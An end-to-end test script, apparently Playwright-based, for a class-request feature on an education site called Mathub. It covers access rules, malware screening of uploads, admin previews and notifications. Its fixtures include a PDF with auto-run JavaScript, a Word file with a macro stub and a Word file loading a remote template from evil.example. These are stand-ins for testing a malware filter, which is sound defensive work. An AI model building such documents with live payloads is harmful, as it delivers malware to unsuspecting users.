/* Request a class: classes are added by Mathub's team, so every student asks for one here (the Create page and every
   "Add a class" link are for administrators only, and the server refuses students Bo's class building). Covered: the
   links that lead to it, the form's checks, uploads checked for malware before they are kept (a PDF with JavaScript,
   a Word file with macros or a template loaded from outside, a file that is not what it says), PDFs, Word files and
   pasted text, "me too" from a second student, withdrawing; the admin tab with a preview of each syllabus (the PDF in a
   frame, the Word file's text, what the malware check looked at), private downloads, Bo building the class from a
   request and adding it to Mathub, and the inbox message that reaches everyone who asked. Uses ZZT course codes and
   removes them at the end. */
const T = require('./lib');
const fs = require('fs'); const path = require('path'); const os = require('os'); const { spawnSync } = require('child_process');
(async () => {
  const { base, mk, txt, login, api: raw, hscroll, go: open, log, check } = await T.start();
  const api = async (...a) => ((await raw(...a)).json || {});
  const go = async (p, hash, wait) => { await open(p, hash, wait); await p.evaluate(() => document.querySelectorAll('.celebrate').forEach(e => e.remove())); };
  const n = 100 + Math.floor(Math.random() * 800); const CODE = `ZZT ${n}`, CODE2 = `ZZT ${n + 1}`, CODE3 = `ZZT ${n + 2}`;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mh-req-')); const f = name => path.join(dir, name);
  fs.writeFileSync(f('syllabus.pdf'), '%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\ntrailer << >>\n%%EOF\n');
  fs.writeFileSync(f('notes.pdf'), 'this is not a pdf');
  fs.writeFileSync(f('tricky.pdf'), '%PDF-1.4\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n%%EOF\n');
  // Word files, made with PHP's zip: a clean one with the syllabus text, one with macros, one that loads a template from the internet
  const docx = (file, text, extra = {}) => {
    const r = spawnSync('php', ['-r', `$z = new ZipArchive(); $z->open($argv[1], ZipArchive::CREATE | ZipArchive::OVERWRITE); $x = json_decode($argv[3], true);
      $z->addFromString('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>');
      $z->addFromString('_rels/.rels', '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>');
      $z->addFromString('word/document.xml', '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>' . implode('', array_map(fn($l) => '<w:p><w:r><w:t>' . htmlspecialchars($l) . '</w:t></w:r></w:p>', explode("\\n", $argv[2]))) . '</w:body></w:document>');
      $z->addFromString('word/printerSettings/printerSettings1.bin', 'printer');
      if (!empty($x['macro'])) $z->addFromString('word/vbaProject.bin', 'Sub AutoOpen()');
      if (!empty($x['remote'])) $z->addFromString('word/_rels/settings.xml.rels', '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>');
      $z->close();`, file, text, JSON.stringify(extra)]);
    if (r.status !== 0) throw new Error(String(r.stderr));
  };
  docx(f('class.docx'), `${CODE3} Testing Chemistry. Fall 2026, Montana State University.\nTopics: ratios, percents, rates and growth.\nExam 1: October 30. Grading: exams 60%, homework 40%.`);
  docx(f('macro.docx'), `${CODE} Testing Chemistry.`, { macro: true });
  docx(f('remote.docx'), `${CODE} Testing Chemistry.`, { remote: true });

  const [ca, a] = await mk(1360, 1000); await go(a, '#/'); await login(a, 'admin.user@montana.edu'); await a.reload(); await a.waitForTimeout(1000);
  if (await a.$('.celebrate')) { await a.keyboard.press('Escape'); await a.waitForTimeout(200); }
  // leftovers from a run that stopped early
  for (const gr of ((await api(a, 'admin_classreqs&status=all')).groups || []).filter(x => x.code.startsWith('ZZT '))) for (const q of gr.requests) await api(a, 'admin_classreq_delete', { id: q.id });

  // ---- guests: sign in first ----
  const [cg, g] = await mk(); await go(g, '#/request', 900);
  check('#/request asks a guest to sign in, with no form', !(await g.$('#rq-form')) && /Sign in to request a class/.test(await txt(g, '#view')));
  check('most requested list loads for guests', (await txt(g, '#rq-top')).length > 5 && !/Loading/.test(await txt(g, '#rq-top')));
  await cg.close();

  // ---- a student: requests are how classes come to Mathub ----
  const [c, p] = await mk(1360, 1000); await go(p, '#/'); await login(p, 'bob.bmu6j92pq@montana.edu'); await p.reload(); await p.waitForTimeout(1000);
  check('a student\'s start page links to Request a class, and never to Create a class', !!(await p.$('.rq-under a[href="#/request"]')) && !(await p.$('#view a[href="#/create"]')) && (await p.evaluate(() => App.auth.user.can_request)) === true);
  check('the sidebar says Request a class instead of Add a class', !!(await p.$('.sb-add[href="#/request"]')) && !(await p.$('.sb-add[href="#/create"]')) && /Request a class/.test(await txt(p, '.sb-add')));
  await go(p, '#/create', 1000);
  check('#/create takes a student to Request a class', /#\/request$/.test(p.url()) && !!(await p.$('#rq-form')) && !(await p.$('#mk-bo')), p.url());
  const noBo = await raw(p, 'ai_class', { step: 'outline', syllabus: { text: 'ZZT 555 Testing. Topics: ratios.' } });
  check('the server does not let a student have Bo write a class', noBo.status === 403 && noBo.json.request === true, noBo.json);
  check('nor publish one', (await raw(p, 'community_publish', { build: 'x', pack: {} })).status === 403);
  await go(p, '#/request', 900);
  await p.click('#rq-send'); await p.waitForTimeout(200);
  check('an empty code is caught before sending', /course code/i.test(await txt(p, '#rq-msg')));
  await p.fill('#rq-code', 'm 171q'); await p.waitForTimeout(100);
  check('a class already on Mathub is pointed to', /already on Mathub/.test(await txt(p, '#rq-code-help')) && !!(await p.$('#rq-code-help a[href="#/calc"]')));
  await p.fill('#rq-code', 'zzt' + n); await p.waitForTimeout(100);
  check('the code is normalised as you type', (await txt(p, '#rq-code-help')).includes(CODE));
  check('the form says the file is checked for malware and only Mathub\'s team sees it', /checked for malware/.test(await txt(p, '.rq-scan')));
  await p.setInputFiles('#rq-file', f('notes.pdf')); await p.waitForTimeout(150);
  check('attaching a file asks for consent', await p.isVisible('#rq-consent-row'));
  await p.click('#rq-send'); await p.waitForTimeout(250);
  check('consent is required with a syllabus', /tick the box/.test(await txt(p, '#rq-msg')));
  await p.check('#rq-consent'); await p.click('#rq-send'); await p.waitForTimeout(700);
  check('a file that is not what it says is refused', /PDF, a Word/.test(await txt(p, '#rq-msg')), await txt(p, '#rq-msg'));
  const sendFile = async file => { await p.setInputFiles('#rq-file', f(file)); await p.check('#rq-consent'); await p.click('#rq-send'); await p.waitForTimeout(900); return txt(p, '#rq-msg'); };
  check('malware check: a PDF with JavaScript is refused, and nothing is kept', /JavaScript/.test(await sendFile('tricky.pdf')) && !(await txt(p, '#rq-mine')).includes(CODE));
  check('malware check: a Word file with macros is refused', /macros/.test(await sendFile('macro.docx')));
  check('malware check: a Word file that loads a template from the internet is refused', /loads something from the internet/.test(await sendFile('remote.docx')));
  await p.fill('#rq-title', 'Test Chemistry'); await p.fill('#rq-note', 'Section 002 please');
  await sendFile('syllabus.pdf');
  const mine = await txt(p, '#rq-mine');
  check('a clean PDF goes through, and the request is listed', mine.includes(CODE) && mine.includes('syllabus.pdf') && /Requested/.test(mine), mine.slice(0, 160));
  check('the form resets after sending', (await p.inputValue('#rq-code')) === '' && !(await p.isVisible('#rq-consent-row')));
  await p.fill('#rq-code', CODE); await p.click('#rq-send'); await p.waitForTimeout(600);
  check('asking twice for the same class is refused', /already asked/.test(await txt(p, '#rq-msg')));
  // a pasted-text request for a second class, then withdraw it
  await p.fill('#rq-code', CODE2); await p.click('[data-action="rq-paste"]'); await p.fill('#rq-text', 'Week 1: intro. Exam 1 Oct 1. Grading: exams 60%.'); await p.check('#rq-consent');
  await p.click('#rq-send'); await p.waitForTimeout(800);
  check('a pasted syllabus works too', (await txt(p, '#rq-mine')).includes('pasted syllabus'));
  const second = (await api(p, 'classreq_mine')).items.find(x => x.code === CODE2);
  await p.click(`[data-action="rq-withdraw"][data-id="${second.id}"]`); await p.waitForTimeout(700);
  check('withdrawing removes the request', !(await txt(p, '#rq-mine')).includes(CODE2));
  // a Word file for a third class: Bo builds it below
  await p.fill('#rq-code', CODE3); await sendFile('class.docx');
  check('a clean Word file goes through', (await txt(p, '#rq-mine')).includes('class.docx'));
  await p.keyboard.press('Control+k'); await p.waitForTimeout(300);
  if (await p.$('#search-input')) { await p.fill('#search-input', 'ZZT 999'); await p.waitForTimeout(300); check('search offers to request an unknown class', /Request ZZT 999/.test(await txt(p, '#search-results')) && !/Make ZZT/.test(await txt(p, '#search-results'))); await p.keyboard.press('Escape'); }
  const [cm, m] = await mk(390, 760); await go(m, '#/'); await login(m, 'bob.bmu6j92pq@montana.edu'); await go(m, '#/request', 900); check('no sideways scroll at 390px', await hscroll(m)); await cm.close();

  // ---- a second student adds their voice ----
  const [c2, s] = await mk(); await go(s, '#/'); await login(s, 'alice.a@montana.edu'); await s.reload(); await s.waitForTimeout(800);
  await go(s, '#/request', 900);
  const metoo = await s.$(`[data-action="rq-metoo"][data-code="${CODE}"]`); check('other students see a Me too button', !!metoo);
  if (metoo) { await metoo.click(); await s.waitForTimeout(800); }
  check('Me too counts a second student', /2 students/.test(await txt(s, '#rq-top')) && (await txt(s, '#rq-mine')).includes(CODE));
  check('students cannot open the admin routes', (await api(s, 'admin_classreqs')).ok === false && (await api(s, 'admin_classreq_preview&id=1')).ok === false);
  await c2.close();

  // ---- the admin: the group, a preview of each syllabus, what the malware check looked at ----
  await go(a, '#/admin/classes', 1200);
  const grp = await txt(a, `.cr-group[data-code="${CODE}"]`);
  check('admin tab groups the requests by class', /2 people/.test(grp) && /1 syllabus/.test(grp) && grp.includes('bob.bmu6j92pq@montana.edu'), grp.slice(0, 160));
  check('a checked file says so', !!(await a.$(`.cr-group[data-code="${CODE}"] .chip.good`)) && /Checked/.test(grp));
  const pdfReq = (await api(a, 'admin_classreqs&status=all')).groups.find(x => x.code === CODE).requests.find(q => q.file_name);
  await a.click(`[data-action="cr-preview"][data-id="${pdfReq.id}"]`); await a.waitForTimeout(1200);
  const pv = await a.evaluate(id => { const b = document.querySelector('#cr-pv-' + id); const fr = b && b.querySelector('iframe.cr-frame'); return b && { shown: !b.hidden, src: fr ? fr.getAttribute('src') : '', scan: (b.querySelector('.cr-scan') || {}).textContent || '', build: !!b.querySelector('[data-action="cr-build"]') }; }, pdfReq.id);
  check('Preview shows the PDF itself, in a frame on the page', pv && pv.shown && /^blob:/.test(pv.src), pv);
  check('with what the malware check looked at: the kind of file, its checks, ClamAV and VirusTotal', pv && /Malware check passed/.test(pv.scan) && /PDF/.test(pv.scan) && /JavaScript/.test(pv.scan) && /ClamAV/.test(pv.scan) && /VirusTotal/.test(pv.scan), pv && pv.scan);
  check('and a way to have Bo build the class from it', pv && pv.build);
  const href = await a.$eval(`.cr-group[data-code="${CODE}"] a[download]`, el => el.getAttribute('href')).catch(() => '');
  const dl = href ? await a.request.get(base.replace('index.html', '') + href) : null;
  check('admin downloads the original file', !!dl && dl.status() === 200 && (await dl.body()).toString().startsWith('%PDF-') && /attachment/.test(dl.headers()['content-disposition'] || ''));
  const asStudent = href ? await p.request.get(base.replace('index.html', '') + href) : null;
  check('students cannot download syllabus files', !!asStudent && asStudent.status() === 403);
  check('alerts reach the admin inbox', (await api(a, 'notif_list')).notifications.some(x => x.kind === 'classreq_admin' && x.title.startsWith(CODE)));

  // ---- Bo builds the class from the Word file's request, and it goes on Mathub ----
  const wordReq = (await api(a, 'admin_classreqs&status=all')).groups.find(x => x.code === CODE3).requests[0];
  await a.click(`[data-action="cr-preview"][data-id="${wordReq.id}"]`); await a.waitForTimeout(1000);
  check('a Word file is previewed as its text', /Testing Chemistry/.test(await txt(a, `#cr-pv-${wordReq.id} .cr-text`)) && /Word document/.test(await txt(a, `#cr-pv-${wordReq.id} .cr-scan`)));
  await a.click(`#cr-pv-${wordReq.id} [data-action="cr-build"][data-size="short"]`);
  let pub = null; for (let i = 0; i < 40 && !pub; i++) { await a.waitForTimeout(500); pub = await a.$(`#cr-pv-${wordReq.id} .cr-out [data-pub]`); }
  check('Bo builds it unit by unit and shows the class before it is added', !!pub && /ZZT/.test(await txt(a, `#cr-pv-${wordReq.id} .cr-out`)) && (await a.$$(`#cr-pv-${wordReq.id} .mk-bo-steps li.done`)).length >= 3, await txt(a, `#cr-pv-${wordReq.id} .cr-build`));
  if (pub) { await pub.click(); await a.waitForTimeout(2000); }
  const id3 = CODE3.replace(' ', '').toLowerCase();
  const packs = await api(a, 'admin_classpacks'); const made = (packs.packs || []).find(x => x.code === CODE3);
  check('Add to Mathub publishes it for everyone', !!made && made.enabled, made);
  const bobReq = (await api(p, 'classreq_mine')).items.find(x => x.code === CODE3);
  check('and the student who asked sees it added, with a message in the inbox', bobReq && bobReq.status === 'added' && bobReq.course_id === (made && made.id) && (await api(p, 'notif_list')).notifications.some(x => x.kind === 'classreq' && x.title === CODE3), bobReq);

  // ---- status changes still work by hand ----
  a.removeAllListeners('dialog'); a.on('dialog', d => d.accept('Thanks, building it now.'));
  await go(a, '#/admin/classes', 1200);
  await a.click(`.cr-group[data-code="${CODE}"] [data-action="cr-set"][data-st="working"]`); await a.waitForTimeout(900);
  check('marking it as being built', /Being built/.test(await txt(a, `.cr-group[data-code="${CODE}"]`)));
  const added = await api(a, 'admin_classreq_update', { code: CODE, status: 'added', note: '', course_id: 'calc' });
  check('marking it added notifies both students', added.ok && added.notified === 2, added);
  const inbox = await api(p, 'notif_list'); const msg = inbox.notifications.find(x => x.kind === 'classreq' && x.title === CODE);
  check('the student gets the update in the inbox', !!msg && msg.link === '#/calc' && /on Mathub/.test(msg.snippet), msg);
  await go(p, '#/', 500); await go(p, '#/request', 900);
  check('the request shows as added with an Open button', /On Mathub/.test(await txt(p, '#rq-mine')) && !!(await p.$('#rq-mine a[href="#/calc"]')));

  // ---- clean up the test classes ----
  const all = await api(a, 'admin_classreqs&status=all'); let removed = 0;
  for (const gr of all.groups.filter(x => x.code.startsWith('ZZT '))) for (const q of gr.requests) { const r = await api(a, 'admin_classreq_delete', { id: q.id }); if (r.ok) removed++; }
  if (second && (await api(a, 'admin_classreq_delete', { id: second.id })).ok) removed++;   // the withdrawn one is not listed, so remove it by id
  if (made) await api(a, 'admin_classpack_delete', { id: made.id, confirm: made.code });
  check('test requests and the class cleaned up', removed >= 3 && !((await api(a, 'admin_classpacks')).packs || []).some(x => x.code === CODE3), removed);
  log(`(class id ${id3})`);
  await ca.close(); await c.close(); fs.rmSync(dir, { recursive: true, force: true });
  await T.finish();
})();
